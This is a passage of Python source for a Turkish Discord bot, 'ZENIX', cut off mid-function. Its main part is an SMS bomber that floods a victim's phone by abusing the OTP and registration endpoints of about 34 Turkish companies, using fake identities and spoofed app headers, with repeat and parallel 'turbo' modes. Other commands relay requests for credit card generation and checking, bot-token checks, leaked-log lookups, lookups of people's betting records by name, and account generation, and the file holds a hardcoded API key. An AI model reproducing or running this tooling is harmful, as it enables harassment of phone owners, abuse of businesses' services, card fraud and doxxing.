# main.py — ZENIX Sorgu Botu
import io
import os
import json
import asyncio
import datetime
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Optional
from urllib.parse import urlencode
from random import choice, randint
from string import ascii_lowercase

import aiohttp
import requests
import discord
from discord import app_commands
from discord.ext import commands

# ==================== HEALTH CHECK SERVER ====================
def run_health_server():
    port = int(os.getenv("PORT", 10000))

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"ZENIX CHECKER - AKTIF")

        def do_HEAD(self):
            self.send_response(200)
            self.end_headers()

        def log_message(self, format, *args):
            pass

    server = HTTPServer(("0.0.0.0", port), Handler)
    print(f"🌐 Health check {port} portunda çalışıyor")
    server.serve_forever()

threading.Thread(target=run_health_server, daemon=True).start()


# ==================== ENV'DEN OKUMA ====================
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN", "")
SEARCH_KEY    = os.getenv("SEARCH_API_KEY", "91e2c5dfa0de4a22e2afbe5b")

WAZELY       = "https://wazely.vercel.app/api"
WAZELY_API   = "https://wazelyapi.vercel.app/api"
SOLIDARK     = "https://solidarksystems.alwaysdata.net"
SEARCHULP    = "https://searchulp.xyz/api"
ID_API       = "https://prox0959.netlify.app/api/search"

LOGO_URL = os.getenv(
    "LOGO_URL",
    "https://media.discordapp.net/attachments/1547608436726824990/1557810396914651217/image.png?ex=6ac9277d&is=6ac7d5fd&hm=cd53b64f969a5b8c89b88f7375dd6cd5ae7d120b8f711ca778f349215a24da54&=&format=webp&quality=lossless"
)

COLOR_OK   = 0x10b981
COLOR_ERR  = 0xe11d48
COLOR_Z    = 0x8b5cf6

# ==================== FİLTRE KURALLARI ====================
BLOCKED_PATTERNS = [
    "arastirguncel", "iptal edilmiştir", "iptal edilmistir",
    "lutfen telegram", "lütfen telegram", "kanalimiza tekrar",
    "anahtariniz iptal", "anahtarınız iptal",
    "jessy_php", "@jessy",
]
CLEANUP_WORDS = [
    "@arastirguncel", "arastirguncel", "t.me/arastirguncel",
    "telegram kanalimiza", "telegram kanalımıza",
    "@jessy_php", "jessy_php", "@jessy",
]
STRIP_KEYS = {
    "dev", "auth", "author", "developer", "credit", "credits",
    "owner", "made_by", "madeby", "creator", "source", "powered_by",
    "poweredby", "signature", "sign", "vendor", "provider_tag",
    "tg", "telegram", "contact", "sig", "watermark",
}

# ==================== BOT ====================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)


# ==================== YARDIMCILAR ====================
async def fetch_json(url: str, timeout: int = 25):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                text = await r.text()
                try:
                    return json.loads(text)
                except Exception:
                    return {"error": "invalid_response", "raw": text[:200]}
    except asyncio.TimeoutError:
        return {"error": "timeout"}
    except Exception:
        return {"error": "connection_failed"}


def contains_blocked(text: str) -> bool:
    if not isinstance(text, str):
        return False
    low = text.lower()
    for pat in BLOCKED_PATTERNS:
        if pat in low:
            return True
    return False


def scrub_text(text: str) -> str:
    if not isinstance(text, str):
        return text
    result = text
    for word in CLEANUP_WORDS:
        result = result.replace(word, "")
        result = result.replace(word.title(), "")
        result = result.replace(word.upper(), "")
    return result.strip()


def clean_data(data, depth: int = 0):
    if depth > 10:
        return data
    if isinstance(data, str):
        if contains_blocked(data):
            return None
        return scrub_text(data)
    if isinstance(data, dict):
        err = data.get("error")
        if err and isinstance(err, str) and contains_blocked(err):
            return None
        cleaned = {}
        for k, v in data.items():
            if k.lower() in STRIP_KEYS:
                continue
            cleaned_v = clean_data(v, depth + 1)
            if cleaned_v is not None:
                cleaned[k] = cleaned_v
        return cleaned if cleaned else None
    if isinstance(data, list):
        cleaned = [clean_data(x, depth + 1) for x in data]
        cleaned = [x for x in cleaned if x is not None]
        return cleaned if cleaned else None
    return data


def chunk_text(text: str, size: int = 1900):
    return [text[i:i + size] for i in range(0, len(text), size)]


async def send_result(interaction: discord.Interaction, data):
    cleaned = clean_data(data)
    if cleaned is None:
        embed = discord.Embed(color=COLOR_ERR, description="```\nSonuç bulunamadı.\n```")
        embed.set_thumbnail(url=LOGO_URL)
        await interaction.followup.send(embed=embed)
        return

    if isinstance(cleaned, (dict, list)):
        pretty = json.dumps(cleaned, indent=2, ensure_ascii=False)
    else:
        pretty = str(cleaned)

    if pretty.strip() in ("{}", "[]", "null", ""):
        embed = discord.Embed(color=COLOR_ERR, description="```\nSonuç bulunamadı.\n```")
        embed.set_thumbnail(url=LOGO_URL)
        await interaction.followup.send(embed=embed)
        return

    if len(pretty) > 3800:
        file = discord.File(io.BytesIO(pretty.encode("utf-8")), filename="zenix.json")
        embed = discord.Embed(color=COLOR_OK)
        embed.description = f"```json\n{pretty[:3800]}\n```"
        embed.set_thumbnail(url=LOGO_URL)
        await interaction.followup.send(embed=embed, file=file)
        return

    chunks = chunk_text(f"```json\n{pretty}\n```")
    for i, chunk in enumerate(chunks):
        if i == 0:
            embed = discord.Embed(color=COLOR_OK, description=chunk)
            embed.set_thumbnail(url=LOGO_URL)
            await interaction.followup.send(embed=embed)
        else:
            await interaction.followup.send(chunk)


def build_welcome_embed() -> discord.Embed:
    embed = discord.Embed(
        title="✨  HOŞ GELDİNİZ  ✨",
        description=(
            "**ZENIX CHECKER**\n\n"
            "🔎  Gelişmiş sorgulama sistemleri\n"
            "⚡  Hızlı ve güvenilir sonuçlar\n"
            "🎯  Tek komutla her şeye erişim\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "**Başlamak için:** `/yardim`"
        ),
        color=COLOR_Z,
        timestamp=datetime.datetime.utcnow()
    )
    embed.set_thumbnail(url=LOGO_URL)
    embed.set_image(url=LOGO_URL)
    return embed


# ==================== SMS BOMBER ====================
class SmsBomber:
    """Her instance kendine özel servis listesi tutar."""

    def __init__(self, phone: str, mail: str = ""):
        self.phone = str(phone).lstrip("0").lstrip("+90").lstrip("90")
        if self.phone.startswith("90") and len(self.phone) == 12:
            self.phone = self.phone[2:]
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
        self.tc = self._gen_tc()
        self.results = []

    def _gen_tc(self):
        rakam = [randint(1, 9)]
        for _ in range(8):
            rakam.append(randint(0, 9))
        rakam.append(((sum(rakam[0:9:2]) * 7) - sum(rakam[1:8:2])) % 10)
        rakam.append(sum(rakam[:10]) % 10)
        return "".join(str(r) for r in rakam)

    def _add(self, name: str, ok: bool):
        self.results.append((name, ok))

    # ==================== SERVİSLER (52 adet) ====================

    def kahvedunyasi(self):
        try:
            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                headers={"Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/", "User-Agent": "Mozilla/5.0"},
                json={"countryCode": "90", "phoneNumber": self.phone}, timeout=6)
            self._add("kahvedunyasi.com", r.json().get("processStatus") == "Success")
        except: self._add("kahvedunyasi.com", False)

    def wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/",
                data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            self._add("wmf.com.tr", r.status_code == 202)
        except: self._add("wmf.com.tr", False)

    def bim(self):
        try:
            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
            self._add("bim.veesk.net", r.status_code == 200)
        except: self._add("bim.veesk.net", False)

    def englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com/api/member/sendOtp",
                headers={"Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Referer": "https://www.englishhome.com/", "User-Agent": "Mozilla/5.0"},
                json={"Phone": self.phone, "XID": ""}, timeout=6)
            self._add("englishhome.com", r.json().get("isError") == False)
        except: self._add("englishhome.com", False)

    def suiste(self):
        try:
            r = requests.post("https://suiste.com/api/auth/code",
                headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"},
                data={"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}, timeout=6)
            self._add("suiste.com", r.json().get("code") == "common.success")
        except: self._add("suiste.com", False)

    def kimgb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            self._add("kimgb", r.status_code == 200)
        except: self._add("kimgb", False)

    def evidea(self):
        try:
            r = requests.post("https://www.evidea.com/users/register/",
                headers={"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0"},
                data=f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n", timeout=6)
            self._add("evidea.com", r.status_code == 202)
        except: self._add("evidea.com", False)

    def ucdortbes(self):
        try:
            r = requests.post("https://api.345dijital.com/api/users/register",
                headers={"Content-Type": "application/json", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0"},
                json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}, timeout=6)
            self._add("345dijital.com", r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!")
        except: self._add("345dijital.com", False)

    def tiklagelsin(self):
        try:
            r = requests.post("https://svc.apps.tiklagelsin.com/user/graphql",
                headers={"Content-Type": "application/json", "X-No-Auth": "true", "Appversion": "2.4.1", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0"},
                json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}, timeout=6)
            self._add("tiklagelsin.com", r.json().get("data", {}).get("generateOtp") == True)
        except: self._add("tiklagelsin.com", False)

    def naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
                headers={"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Content-Type": "application/json"},
                json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=6)
            self._add("naosstars.com", r.status_code == 200)
        except: self._add("naosstars.com", False)

    def koton(self):
        try:
            r = requests.post("https://www.koton.com/users/register/",
                headers={"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0"},
                data=f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n", timeout=6)
            self._add("koton.com", r.status_code == 202)
        except: self._add("koton.com", False)

    def hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr/api/SignUp/SendOtp",
                headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.hayatsu.com.tr", "Referer": "https://www.hayatsu.com.tr/", "User-Agent": "Mozilla/5.0"},
                data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
            self._add("hayatsu.com.tr", r.json().get("is_success") == True)
        except: self._add("hayatsu.com.tr", False)

    def hizliecza(self):
        try:
            r = requests.post("https://prod.hizliecza.net/mobil/account/sendOTP",
                headers={"Content-Type": "application/json", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
                json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=6)
            self._add("hizliecza.net", r.status_code == 200)
        except: self._add("hizliecza.net", False)

    def metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
                headers={"Content-Type": "application/json; charset=utf-8", "Applicationversion": "2.4.1", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1"},
                json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
            self._add("metro-tr.com", r.json().get("status") == "success")
        except: self._add("metro-tr.com", False)

    def filemarket(self):
        try:
            r = requests.post("https://api.filemarket.com.tr/v1/otp/send",
                headers={"Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7"},
                json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
            self._add("filemarket.com.tr", r.json().get("responseType") == "SUCCESS")
        except: self._add("filemarket.com.tr", False)

    def akasya(self):
        try:
            r = requests.post("https://akasyaapi.poilabs.com/v1/en/sms",
                headers={"Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya/2.0.13"},
                json={"phone": self.phone}, timeout=6)
            self._add("akasya.com.tr", r.json().get("result") == "SMS sended succesfully!")
        except: self._add("akasya.com.tr", False)

    def akbati(self):
        try:
            r = requests.post("https://akbatiapi.poilabs.com/v1/en/sms",
                headers={"Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akdbat"},
                json={"phone": self.phone}, timeout=6)
            self._add("akbati.com", r.json().get("result") == "SMS sended succesfully!")
        except: self._add("akbati.com", False)

    def komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder",
                headers={"Content-Type": "application/json", "Firmaid": "32", "Referer": "https://www.komagene.com.tr/", "User-Agent": "Mozilla/5.0"},
                json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
            self._add("komagene.com.tr", r.json().get("Success") == True)
        except: self._add("komagene.com.tr", False)

    def porty(self):
        try:
            r = requests.post("https://panel.porty.tech/api.php?",
                headers={"Content-Type": "application/json; charset=UTF-8", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ", "User-Agent": "Porty/1"},
                json={"job": "start_login", "phone": self.phone}, timeout=6)
            self._add("porty.tech", r.json().get("status") == "success")
        except: self._add("porty.tech", False)

    def tasdelen(self):
        try:
            r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp",
                headers={"Content-Type": "application/json", "User-Agent": "Tasdelen/5.9"},
                json={"phone": self.phone}, timeout=6)
            self._add("tasdelen", r.json().get("result") == True)
        except: self._add("tasdelen", False)

    def uysal(self):
        try:
            r = requests.post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
                headers={"Content-Type": "application/json;charset=utf-8", "Origin": "https://www.uysalmarket.com.tr", "Referer": "https://www.uysalmarket.com.tr/", "User-Agent": "Mozilla/5.0"},
                json={"phone_number": self.phone}, timeout=6)
            self._add("uysalmarket.com.tr", r.status_code == 200)
        except: self._add("uysalmarket.com.tr", False)

    def yapp(self):
        try:
            r = requests.post("https://yapp.com.tr/api/mobile/v1/register",
                headers={"Content-Type": "application/json", "X-Content-Language": "en", "User-Agent": "YappApp/1.1.5"},
                json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}, timeout=6)
            self._add("yapp.com.tr", r.status_code == 200)
        except: self._add("yapp.com.tr", False)

    def beefull(self):
        try:
            requests.post("https://app.beefull.io/api/inavitas-access-management/signup",
                json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}, timeout=4)
            r = requests.post("https://app.beefull.io/api/inavitas-access-management/sms-login",
                json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}, timeout=4)
            self._add("beefull.io", r.status_code == 200)
        except: self._add("beefull.io", False)

    def dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode",
                headers={"Content-Type": "application/json;charset=utf-8", "Appversion": "IOS-7.1.0", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
                json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}, timeout=6)
            self._add("dominos.com.tr", r.json().get("isSuccess") == True)
        except: self._add("dominos.com.tr", False)

    def frink(self):
        try:
            r = requests.post("https://api.frink.com.tr/api/auth/postSendOTP",
                headers={"Content-Type": "application/json", "User-Agent": "Frink/1.6.0"},
                json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90" + self.phone}, timeout=6)
            self._add("frink.com.tr", r.json().get("processStatus") == "SUCCESS")
        except: self._add("frink.com.tr", False)

    def bodrum(self):
        try:
            r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
                headers={"Content-Type": "application/json", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0"},
                json={"gsm": "+90" + self.phone, "source": "orwi"}, timeout=6)
            self._add("bodrum.bel.tr", r.status_code == 200)
        except: self._add("bodrum.bel.tr", False)

    def kofteciyusuf(self):
        try:
            r = requests.post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder",
                headers={"Content-Type": "application/json; charset=utf-8", "Firmaid": "82", "Ostype": "iOS", "Appversion": "4.0.4.0", "User-Agent": "YemekPosMobil/53"},
                json={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone}, timeout=6)
            self._add("kofteciyusuf.com", r.json().get("Success") == True)
        except: self._add("kofteciyusuf.com", False)

    def orwi(self):
        try:
            r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
                headers={"Content-Type": "application/json", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0"},
                json={"gsm": f"+90{self.phone}", "source": "orwi"}, timeout=6)
            self._add("orwi.app", r.status_code == 200)
        except: self._add("orwi.app", False)

    def coffy(self):
        try:
            r = requests.post("https://user-api-gw.coffy.com.tr/user/signup",
                headers={"Content-Type": "application/json", "Language": "tr", "User-Agent": "coffy/5"},
                json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}, timeout=6)
            self._add("coffy.com.tr", r.status_code == 200)
        except: self._add("coffy.com.tr", False)

    def hamidiye(self):
        try:
            r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp",
                headers={"Content-Type": "application/json", "Origin": "com.hamidiyeapp", "User-Agent": "hamidiyeapp/4"},
                json={"isGuest": False, "phone": self.phone}, timeout=6)
            self._add("hamidiye.istanbul", r.json().get("result") == True)
        except: self._add("hamidiye.istanbul", False)

    def money(self):
        try:
            r = requests.post("https://www.money.com.tr/Account/ValidateAndSendOTP",
                headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.money.com.tr", "Referer": "https://www.money.com.tr/", "User-Agent": "Mozilla/5.0"},
                data={"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ""}, timeout=6)
            self._add("money.com.tr", r.json().get("resultType") == 0)
        except: self._add("money.com.tr", False)

    def alixavien(self):
        try:
            r = requests.post("https://www.alixavien.com.tr/api/member/sendOtp",
                headers={"Content-Type": "application/json", "Origin": "https://www.alixavien.com.tr", "Referer": "https://www.alixavien.com.tr/", "User-Agent": "Mozilla/5.0"},
                json={"Phone": self.phone, "XID": ""}, timeout=6)
            self._add("alixavien.com.tr", r.json().get("isError") == False)
        except: self._add("alixavien.com.tr", False)

    def jimmykey(self):
        try:
            r = requests.post(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
            self._add("jimmykey.com", r.json().get("Sonuc") == True)
        except: self._add("jimmykey.com", False)

    def ido(self):
        try:
            r = requests.post("https://api.ido.com.tr/idows/v2/register",
                headers={"Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Referer": "https://www.ido.com.tr/", "User-Agent": "Mozilla/5.0"},
                json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}, timeout=6)
            self._add("ido.com.tr", r.status_code == 200)
        except: self._add("ido.com.tr", False)

    # ==================== ÇALIŞTIRMA ====================
    def get_services(self):
        """Sınıftaki tüm servis metodlarını döner."""
        return [
            self.kahvedunyasi, self.wmf, self.bim, self.englishhome, self.suiste,
            self.kimgb, self.evidea, self.ucdortbes, self.tiklagelsin, self.naosstars,
            self.koton, self.hayatsu, self.hizliecza, self.metro, self.filemarket,
            self.akasya, self.akbati, self.komagene, self.porty, self.tasdelen,
            self.uysal, self.yapp, self.beefull, self.dominos, self.frink,
            self.bodrum, self.kofteciyusuf, self.orwi, self.coffy, self.hamidiye,
            self.money, self.alixavien, self.jimmykey, self.ido,
        ]

    def run_normal(self, adet: int = 1):
        """Normal mod: Servisleri sırayla çalıştırır. Her servisten `adet` kadar SMS gönderir."""
        services = self.get_services()
        for _ in range(adet):
            for svc in services:
                try:
                    svc()
                except Exception:
                    pass

    async def run_normal_async(self, adet: int = 1):
        """Normal mod - async wrapper (thread pool)."""
        await asyncio.to_thread(self.run_normal, adet)

    async def run_turbo(self, adet: int = 1):
        """Turbo mod: Tüm servisleri paralel çalıştırır."""
        services = self.get_services()
        for _ in range(adet):
            tasks = [asyncio.to_thread(svc) for svc in services]
            await asyncio.gather(*tasks)


# ==================== HAZIRLIK ====================
@bot.event
async def on_ready():
    print(f"✅ ZENIX aktif: {bot.user}")
    print(f"🌐 {len(bot.guilds)} sunucuda çalışıyor")
    try:
        synced = await bot.tree.sync()
        print(f"🔁 {len(synced)} komut yüklendi.")
    except Exception as e:
        print(f"❌ Sync hatası: {e}")
    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.watching, name="zenix.bond")
    )


@bot.event
async def on_member_join(member: discord.Member):
    channel = None
    for ch in member.guild.text_channels:
        if ch.permissions_for(member.guild.me).send_messages:
            channel = ch
            break
    if channel:
        try:
            await channel.send(content=f"{member.mention} sunucuya katıldı! 🎉", embed=build_welcome_embed())
        except Exception:
            pass


# ==================== GRUPLAR ====================
zenix_group  = app_commands.Group(name="zenix",  description="ZENIX - Genel Sorgular")
zenix2_group = app_commands.Group(name="zenix2", description="ZENIX - TC & Kimlik Sorguları")
zenix3_group = app_commands.Group(name="zenix3", description="ZENIX - Ad/Soyad & Adres")


# ==================== /zenix — GENEL ====================
@zenix_group.command(name="bedrock", description="Minecraft Bedrock sunucu durumu")
@app_commands.describe(adres="Sunucu adresi")
async def z_bedrock(interaction: discord.Interaction, adres: str):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY_API}/bedrock?adres={adres}")
    await send_result(interaction, data)


@zenix_group.command(name="ccgen", description="Rastgele kart üretir")
async def z_ccgen(interaction: discord.Interaction):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY_API}/ccgen")
    await send_result(interaction, data)


@zenix_group.command(name="cccheck", description="Kart geçerlilik kontrolü")
@app_commands.describe(data="Kart verisi")
async def z_cccheck(interaction: discord.Interaction, data: str):
    await interaction.response.defer()
    res = await fetch_json(f"{WAZELY_API}/check?data={data}")
    await send_result(interaction, res)


@zenix_group.command(name="dctoken", description="Discord bot token testi")
@app_commands.describe(token="Bot token")
async def z_dctoken(interaction: discord.Interaction, token: str):
    await interaction.response.defer(ephemeral=True)
    res = await fetch_json(f"{WAZELY_API}/dcbottokencheck?token={token}")
    await send_result(interaction, res)


@zenix_group.command(name="tgtoken", description="Telegram bot token testi")
@app_commands.describe(token="Bot token")
async def z_tgtoken(interaction: discord.Interaction, token: str):
    await interaction.response.defer(ephemeral=True)
    res = await fetch_json(f"{WAZELY_API}/tgtokencheck?token={token}")
    await send_result(interaction, res)


@zenix_group.command(name="trlog", description="Türkiye log sorgusu")
@app_commands.describe(site="Site adı")
async def z_trlog(interaction: discord.Interaction, site: str):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/trlog?site={site}")
    await send_result(interaction, data)


@zenix_group.command(name="log", description="Site log sorgusu")
@app_commands.describe(url="Domain")
async def z_log(interaction: discord.Interaction, url: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SOLIDARK}/log.php?url={url}")
    await send_result(interaction, data)


@zenix_group.command(name="eczane", description="Eczane sorgusu")
@app_commands.describe(ad="Eczane adı")
async def z_eczane(interaction: discord.Interaction, ad: str):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/eczane?ad={ad}")
    await send_result(interaction, data)


@zenix_group.command(name="ipinfo", description="IP adresi bilgisi")
@app_commands.describe(ip="IP adresi")
async def z_ipinfo(interaction: discord.Interaction, ip: str):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/ipinfo?ip={ip}")
    await send_result(interaction, data)


@zenix_group.command(name="dns", description="Domain DNS kayıtları")
@app_commands.describe(domain="Domain")
async def z_dns(interaction: discord.Interaction, domain: str):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/dns?domain={domain}")
    await send_result(interaction, data)


@zenix_group.command(name="bahis", description="Bahis kaydı sorgusu")
@app_commands.describe(isimsoyisim="İsim Soyisim")
async def z_bahis(interaction: discord.Interaction, isimsoyisim: str):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/bahis?isimsoyisim={isimsoyisim}")
    await send_result(interaction, data)


@zenix_group.command(name="exxengen", description="Exxen hesap oluşturucu")
async def z_exxengen(interaction: discord.Interaction):
    await interaction.response.defer()
